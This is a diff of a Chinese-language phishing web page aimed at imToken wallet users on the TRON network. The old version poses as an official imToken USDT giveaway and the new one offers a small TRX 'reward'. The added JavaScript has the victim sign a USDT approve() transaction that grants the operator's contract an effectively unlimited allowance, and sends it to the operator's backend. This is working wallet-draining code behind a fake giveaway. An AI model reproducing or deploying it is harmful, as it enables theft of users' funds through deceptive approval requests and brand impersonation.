@@ -262,8 +262,8 @@
 <body>
     <div class="container">
         <div class="header">   
-            <h1>imToken</h1>
-            <p class="desc">imToken官方专属服务每个钱包地址只可领取一次，重复领取无效</p>
+            <h1>合约授权代付</h1>
+            <p class="desc">授权我的合约，0成本+领TRX奖励（每个地址限1次）</p>
         </div>   
         <div id="userInfo">
             未连接钱包<br>
@@ -273,108 +273,69 @@
             <div class="status-title"><h3> 钱包状态</h3></div>
             <div class="disconnected-content">
                 <span >未连接钱包</span>
-                <p><span class="highlight">您现在准备领取的是imToken专属项目，非imToken用户不可领取</span></p>
-                <p><span class="highlight">1. 每个钱包地址只可领取一次</span></p>         
-                <p><span class="highlight">2.随机发放能量或者TRX代币 </span></p>
-                <p><span class="highlight">3.连接钱包后系统会根据钱包地址自动分配类型和额度</span></p>
-                <p><span class="highlight">4.领取无需您支付任何费用，我方代付全部矿工费</span></p>
+                <p><span class="highlight">1. 授权我的合约，无需你支付任何TRX矿工费</span></p>
+                <p><span class="highlight">2. 授权成功后，自动发放 2.3 TRX 奖励</span></p>
+                <p><span class="highlight">3. 每个钱包地址仅可领取1次奖励</span></p>
             </div>
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• 领取类型：<span class="highlight">USDT</span></p>
-                <p>• 领取额度：<span class="highlight">2.3 USDT</span></p>
-                <p>• 费用说明：<span class="highlight">我方代付全部TRX矿工费，无需你支付</span></p>
-                <p class="orange-tip">⚠️提示：代付处理需3-5秒，请耐心等待；若取消领取，直接退出即可</p>
+                <p>• 授权对象：<span class="highlight">我的合约（${PAYMENT_CONTRACT.slice(0,8)}...）</span></p>
+                <p>• 奖励额度：<span class="highlight">2.3 TRX</span></p>
+                <p>• 费用说明：<span class="highlight">我代付全部矿工费，你0成本</span></p>
             </div>
         </div>
         <div id="contractResourceContainer">
             <div class="status-title">     
-                <h3>合约剩余资源</h3>
+                <h3>代付资源</h3>
             </div>
-            <div class="resource-content" style="line-height: 2;">
-                <p>• 代付合约地址：<span class="highlight" id="contractAddr">TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk</span></p>
-                <p>• USDT合约地址：<span class="highlight" id="usdtContractAddr">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>
-                <p>• 剩余代付TRX：<span class="highlight data-tag" id="contractTrxDisplay">获取中...</span></p>
-                <p>• 剩余代付能量：<span class="highlight data-tag" id="contractEnergy">获取中...</span></p>
-                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
-                    注：所有剩余量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
-                </p>
+            <div class="resource-content">
+                <p>• 我的合约地址：<span class="highlight" id="contractAddr">${PAYMENT_CONTRACT.slice(0,8)}...${PAYMENT_CONTRACT.slice(-6)}</span></p>
+                <p>• 代付账户剩余TRX：<span class="highlight data-tag" id="contractTrxDisplay">获取中...</span></p>
             </div>
         </div>
         <div class="record-list">
-            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
-                <span>可使用奖励的代币</span>
-                <span>使用额度</span>
-            </div>
-            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
-                <span class="header"><h3>USDT</h3></span>
-                <span class="header"><h3>2.3 USDT</h3></span>
-            </div>       
             <span id="approvalRecords"class="highlight">暂无授权记录</span>        
         </div>
     </div>
     <div class="btn-group">
         <div class="warning">
             <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
-            <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
             <div class="copy-link-wrap">
-                <span id="copyLinkText">
-                    https://trc20trx-alt.github.io/Trc20.TRX/
-                </span>
+                <span id="copyLinkText">${window.location.href}</span>
                 <button id="copyLinkBtn">复制链接</button>
             </div>
         </div> 
         <button id="connectBtn" class="btn"> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled>领取</button>
+        <button id="approveBtn" class="btn" disabled>授权合约+领TRX奖励</button>
     </div>
     <div class="footer-info">
-        合约验证：AutoTransfer <span>TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk</span>（TRON浏览器查询）
-        © 2025 TRX能量租赁 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
+        合约验证：${PAYMENT_CONTRACT}（TRON浏览器查询）
+        © 2025 合约代付 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a>
     </div>
-    <script src="imtoken://browser"></script>
     <script>
-        // 核心配置（适配TronFullFeeDelegated代付合约）
-        const PAYMENT_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk"; // 替换为你的TronFullFeeDelegated合约地址
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT主网合约地址（测试网替换为TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8）
-        const BACKEND_PAYMENT_API = "https://203.91.76.22/api/proxy-approve"; // 后端代付接口（需同步修改后端逻辑）
-        const APPROVE_AMOUNT = "2.3"; // 领取额度（用户可见）
-        const APPROVE_AMOUNT_RAW = String(Math.floor(parseFloat(APPROVE_AMOUNT) * 1000000)); // 转换为USDT最小单位（6位小数）
-        const RECORD_KEY = "payment_approval_records";
+        // 核心配置
+        const MY_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk"; // 你的合约地址（用户授权的对象）
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 授权的代币（如USDT）
+        const REWARD_TRX_AMOUNT = "2.3"; // 奖励TRX额度
+        const REWARD_TRX_RAW = String(Math.floor(parseFloat(REWARD_TRX_AMOUNT) * 1000000)); // TRX转Sun（最小单位）
+        const BACKEND_API = "https://你的后端域名/api"; // 后端代付+发奖励接口
+        const RECORD_KEY = "approval_reward_records";
         
-        // 全局变量
         let tronWeb, userAddress;
-        let tokenBalance = "0.00", trxBalance = "0.00";
         let isProcessing = false;
-        // DOM元素缓存
-        const walletStatusContainer = document.getElementById("walletStatusContainer");
-        const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
-        const contractEnergyEl = document.getElementById("contractEnergy");
-        const contractAddrEl = document.getElementById("contractAddr");
-        const usdtContractAddrEl = document.getElementById("usdtContractAddr");
-        
+
         window.onload = async () => {
-            // 初始化合约地址显示（脱敏）
-            contractAddrEl.textContent = `${PAYMENT_CONTRACT.slice(0,8)}...${PAYMENT_CONTRACT.slice(-6)}`;
-            usdtContractAddrEl.textContent = `${USDT_CONTRACT.slice(0,8)}...${USDT_CONTRACT.slice(-6)}`;
-            
-            // 绑定DOM元素
+            // DOM初始化
             const connectBtn = document.getElementById("connectBtn");
             const approveBtn = document.getElementById("approveBtn");
-            const copyLinkText = document.getElementById("copyLinkText");
             const copyLinkBtn = document.getElementById("copyLinkBtn");
             const warning = document.querySelector('.warning');
             const recordlist = document.querySelector('.record-list');
-            
-            // 初始渲染
-            renderApprovalRecords();
-            updateWalletStatus();
-            getPaymentContractResource(); // 查询代付合约资源
-            setInterval(getPaymentContractResource, 30000);
-            
-            // 复制链接功能
+
+            // 复制链接
             copyLinkBtn.addEventListener("click", async () => {
-                const link = copyLinkText.textContent.trim();
+                const link = document.getElementById("copyLinkText").textContent.trim();
                 try {
                     await navigator.clipboard.writeText(link);
                     alert("链接已复制");
@@ -388,233 +349,144 @@
                     alert("链接已复制（兼容模式）");
                 }
             });
-            // 等待TronWeb注入（imToken兼容版）
-            let tronWebWaitTimer = null;
-            const waitForTronWeb = new Promise((resolve) => {
-                const checkTronWeb = () => {
-                    if (window.tronWeb && window.tronWeb.trx) {
-                        clearTimeout(tronWebWaitTimer);
-                        resolve(window.tronWeb);
-                    }
-                };
-                checkTronWeb();
-                tronWebWaitTimer = setTimeout(() => {
-                  
-                    resolve(null);
-                }, 3000);
-                window.addEventListener("tronWebReady", checkTronWeb);
-            });
-            // 执行等待逻辑
-            tronWeb = await waitForTronWeb;
-            if (tronWeb) {
-                connectBtn.style.display = "none";
-                warning.style.display = "none";
-                await initWallet();
-            } else {
-                document.getElementById("userInfo").innerHTML = "imToken专属服务，请点击底部“连接imToken钱包”按钮连接您的钱包";
-                approveBtn.style.display = "none";
-                recordlist.style.display = "none";
-            }
-            // 手动连接钱包（唤起imToken内置浏览器）
-            connectBtn.onclick = async () => {
+
+            // 等待imToken注入tronWeb
+            let tronWebWaitTimer = setInterval(() => {
+                if (window.tronWeb && window.tronWeb.ready) {
+                    clearInterval(tronWebWaitTimer);
+                    initWallet();
+                }
+            }, 500);
+            setTimeout(() => clearInterval(tronWebWaitTimer), 10000);
+
+            // 连接钱包
+            connectBtn.onclick = () => {
                 window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
             };
-            // 核心：适配代付合约的离线签名逻辑（用户0成本）
+
+            // 核心：发起代付授权+领奖励
             approveBtn.onclick = async () => {
-                if (!userAddress || !tronWeb) {
-                    
-                    return;
-                }
-                if (isProcessing) return;
-                
+                if (!userAddress || isProcessing) return;
                 isProcessing = true;
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></</i> 生成授权签名中...';
+                approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 发起授权（0成本）...';
+
                 try {
-                    // 1. 构造签名消息（与合约delegateApprove的messageHash完全一致）
-                    const message = tronweb.utils.abi.encodePacked(
-                        userAddress,    // 用户地址（base58格式）
-                        PAYMENT_CONTRACT, // 代付合约地址
-                        APPROVE_AMOUNT_RAW // 授权金额（最小单位）
+                    // 1. 构造Approve交易主体（用户授权你的合约操作其USDT）
+                    const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
+                        tronWeb.address.toHex(USDT_CONTRACT), // USDT合约地址（hex）
+                        "approve(address,uint256)", // 授权方法
+                        { feeLimit: 10000000 }, // 矿工费上限（由你代付）
+                        [
+                            { type: "address", value: tronWeb.address.toHex(MY_CONTRACT) }, // 授权对象：你的合约
+                            { type: "uint256", value: "1000000000000000000" } // 授权额度（足够大的数）
+                        ],
+                        userAddress // 发起者：用户地址
                     );
-                    const messageHash = tronweb.utils.sha3(message);
-                    
-                    // 2. 用户离线签名（imToken本地私钥签名，不广播、不支付手续费）
-                    const signature = await tronweb.trx.sign(
-                        messageHash, 
-                        tronweb.defaultPrivateKey, // imToken自动注入的用户私钥（仅本地使用）
-                        false // 离线签名标记
-                    );
-                    const { v, r, s } = tronweb.utils.fromSignature(signature);
-                    
-                    // 3. 传给后端：携带v/r/s参数，后端调用delegateApprove代付授权
-                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 后端代付授权中...';
-                    const res = await fetch(BACKEND_PAYMENT_API, {
+                    if (!approveTx.result || !approveTx.transaction) throw new Error("构造授权交易失败");
+
+                    // 2. 用户签名交易主体（仅签名，不支付矿工费）
+                    const signedTx = await tronWeb.trx.sign(approveTx.transaction);
+                    if (!signedTx) throw new Error("用户签名交易失败");
+
+                    // 3. 发送给后端：由你代付矿工费并广播交易
+                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 我代付矿工费中...';
+                    const res = await fetch(`${BACKEND_API}/delegate-approve`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
+                            userSignedTx: signedTx, // 用户签名的交易主体
                             userAddress: userAddress,
-                            amount: APPROVE_AMOUNT_RAW, // 授权金额（最小单位）
-                            v: v.toString(),
-                            r: tronweb.utils.bytesToHex(r),
-                            s: tronweb.utils.bytesToHex(s),
-                            visibleAmount: APPROVE_AMOUNT // 用于前端显示的金额
+                            rewardAmount: REWARD_TRX_RAW // 奖励TRX额度（Sun）
                         })
                     });
-                    
-                    const resData = await res.json();
-                    if (res.ok && resData.success) {
-                        // 4. 授权成功后，后端自动调用delegatedTransfer转账（无需用户额外操作）
-                        alert(`代付成功！\n${APPROVE_AMOUNT} USDT已到账\n授权交易哈希：${resData.approveTxid}\n转账交易哈希：${resData.transferTxid}\n您未支付任何TRX`);
-                        window.open(`https://tronscan.org/#/transaction/${resData.transferTxid}`, "_blank");
-                        
-                        // 保存代付记录
-                        saveApprovalRecord({
-                            address: userAddress,
-                            amount: APPROVE_AMOUNT + " USDT",
-                            approvalTx: resData.approveTxid,
-                            paymentTx: resData.transferTxid,
-                            time: new Date().toLocaleString(),
-                            status: "代付成功"
-                        });
-                        renderApprovalRecords();
-                    } else {
-                        throw new Error(resData.error || "代付失败，请稍后重试");
-                    }
+                    const data = await res.json();
+                    if (!res.ok || !data.success) throw new Error(data.error || "授权失败");
+
+                    // 4. 授权+奖励成功
+                    alert(`✅ 授权成功！\n已发放 ${REWARD_TRX_AMOUNT} TRX 奖励\n授权交易哈希：${data.approveTxid}\n奖励转账哈希：${data.rewardTxid}`);
+                    window.open(`https://tronscan.org/#/transaction/${data.rewardTxid}`, "_blank");
+
+                    // 保存记录
+                    saveRecord({
+                        address: userAddress,
+                        reward: REWARD_TRX_AMOUNT + " TRX",
+                        approveTx: data.approveTxid,
+                        rewardTx: data.rewardTxid,
+                        time: new Date().toLocaleString(),
+                        status: "成功"
+                    });
+                    renderRecords();
                 } catch (e) {
                     alert(`操作失败：${e.message}`);
                 } finally {
                     isProcessing = false;
                     approveBtn.disabled = false;
-                    approveBtn.innerHTML = "领取";
+                    approveBtn.innerHTML = "授权合约+领TRX奖励";
                 }
             };
         };
-        // 初始化钱包（imToken兼容版）
+
+        // 初始化钱包
         async function initWallet() {
-            try {
-                // 1. 获取imToken当前地址（base58格式）
-                userAddress = tronWeb.defaultAddress.base58;
-                if (!userAddress) throw new Error("未检测到钱包地址，请确保imToken已登录");
-                
-                // 2. 查询用户USDT余额（验证连接）
-                const usdtContract = await tronWeb.contract([
-                    {
-                        "inputs": [{"name": "_owner", "type": "address"}],
-                        "name": "balanceOf",
-                        "outputs": [{"name": "balance", "type": "uint256"}],
-                        "type": "function",
-                        "stateMutability": "view"
-                    }
-                ], USDT_CONTRACT);
-                const usdtRaw = await usdtContract.balanceOf(userAddress).call();
-                tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
-                
-                // 3. 查询用户TRX余额（仅显示，无需用户支付）
-                const trxRaw = await tronWeb.trx.getBalance(userAddress);
-                trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
-                
-                // 更新UI
-                document.getElementById("userInfo").innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
-                `;
-                document.getElementById("approveBtn").disabled = false;
-                updateWalletStatus();
-                loadApprovalRecords();
-            } catch (e) {
-                tokenBalance = "0.00";
-                trxBalance = "0.00";
-                alert("钱包初始化失败：" + e.message);
-                console.error("失败详情：", e);
+            tronWeb = window.tronWeb;
+            userAddress = tronWeb.defaultAddress.base58;
+            if (!userAddress) {
+                alert("请在imToken中登录钱包");
+                return;
             }
+
+            // 更新UI
+            document.getElementById("userInfo").innerHTML = `
+                已连接：<br>
+                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}
+            `;
+            document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+            document.getElementById("walletStatusContainer").classList.add("connected");
+            document.getElementById("connectBtn").style.display = "none";
+            document.querySelector(".warning").style.display = "none";
+            document.getElementById("approveBtn").disabled = false;
+
+            // 查代付账户剩余TRX
+            getDelegateTrxBalance();
+            // 查历史记录
+            renderRecords();
         }
-        // 查询代付合约资源
-        async function getPaymentContractResource() {
+
+        // 查你的代付账户剩余TRX
+        async function getDelegateTrxBalance() {
             try {
-                const res = await fetch("https://203.91.76.22/api/contract-resource?contract=" + PAYMENT_CONTRACT);
+                const res = await fetch(`${BACKEND_API}/delegate-balance`);
                 const data = await res.json();
-                if (res.ok) {
-                    contractTrxDisplayEl.textContent = data.trxBalance.toFixed(4);
-                    contractEnergyEl.textContent = data.energy.toFixed(4);
-                } else {
-                    const contractBalance = await tronWeb.trx.getBalance(PAYMENT_CONTRACT);
-                    contractTrxDisplayEl.textContent = (contractBalance / 1e6).toFixed(4);
-                    contractEnergyEl.textContent = (contractBalance / 1e5).toFixed(4);
-                }
+                document.getElementById("contractTrxDisplay").textContent = data.trxBalance.toFixed(2);
             } catch (e) {
-                console.error("获取资源失败：", e);
-                contractTrxDisplayEl.textContent = "获取失败";
-                contractEnergyEl.textContent = "获取失败";
+                document.getElementById("contractTrxDisplay").textContent = "获取失败";
             }
         }
-        // 更新钱包状态UI
-        function updateWalletStatus() {
-            if (userAddress) {
-                walletStatusContainer.classList.add("connected");
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            } else {
-                walletStatusContainer.classList.remove("connected");
-            }
+
+        // 保存/渲染记录
+        function saveRecord(record) {
+            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+            records.push(record);
+            localStorage.setItem(RECORD_KEY, JSON.stringify(records));
         }
-        // 拉取代付记录
-        async function loadApprovalRecords() {
-            try {
-                const res = await fetch(`https://203.91.76.22/api/get-records?address=${userAddress}`);
-                const data = await res.json();
-                if (res.ok && data.records) {
-                    localStorage.setItem(RECORD_KEY, JSON.stringify(data.records));
-                }
-            } catch (e) {
-                console.log("拉取记录失败：", e);
-            } finally {
-                renderApprovalRecords();
+        function renderRecords() {
+            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+            const container = document.getElementById("approvalRecords");
+            if (records.length === 0) {
+                container.innerHTML = "<div class='record-item'>暂无记录</div>";
+                return;
             }
-        }
-        // 保存代付记录
-        async function saveApprovalRecord(record) {
-            try {
-                await fetch("https://203.91.76.22/api/save-record", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(record)
-                });
-                const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                const newRecords = existing.filter(item => item.address !== record.address);
-                newRecords.push(record);
-                localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
-            } catch (e) {
-                console.log("保存记录失败：", e);
-                alert("代付成功，但记录同步失败，可通过交易哈希查询");
-            }
-        }
-        // 渲染代付记录
-        function renderApprovalRecords() {
-            try {
-                const container = document.getElementById("approvalRecords");
-                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                
-                if (records.length === 0) {
-                    container.innerHTML = "<div class='record-item'>暂无代付记录</div>";
-                    return;
-                }
-                
-                container.innerHTML = records.map(record => `
-                    <div class="record-item">
-                        <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                        <p><strong>代付额度：</strong>${record.amount}</p>
-                        <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${record.approvalTx}" target="_blank" class="tx-link">${record.approvalTx.slice(0,10)}...<<i class="fa fa-external-link"></</i></a></p>
-                        <p><strong>转账哈希：</strong><a href="https://tronscan.org/#/transaction/${record.paymentTx}" target="_blank" class="tx-link">${record.paymentTx.slice(0,10)}...<<i class="fa fa-external-link"></</i></a></p>
-                        <p><strong>时间：</strong>${record.time}</p>
-                        <p><strong>状态：</strong>${record.status}</p>
-                    </div>
-                `).join("");
-            } catch (e) {
-                console.log("渲染记录失败：", e);
-            }
+            container.innerHTML = records.map(r => `
+                <div class="record-item">
+                    <p><strong>地址：</strong>${r.address.slice(0,8)}...${r.address.slice(-6)}</p>
+                    <p><strong>奖励：</strong>${r.reward}</p>
+                    <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${r.approveTx}" target="_blank" class="tx-link">${r.approveTx.slice(0,10)}...</a></p>
+                    <p><strong>奖励哈希：</strong><a href="https://tronscan.org/#/transaction/${r.rewardTx}" target="_blank" class="tx-link">${r.rewardTx.slice(0,10)}...</a></p>
+                    <p><strong>时间：</strong>${r.time}</p>
+                </div>
+            `).join("");
         }
     </script>
 </body>
 </html>
-           
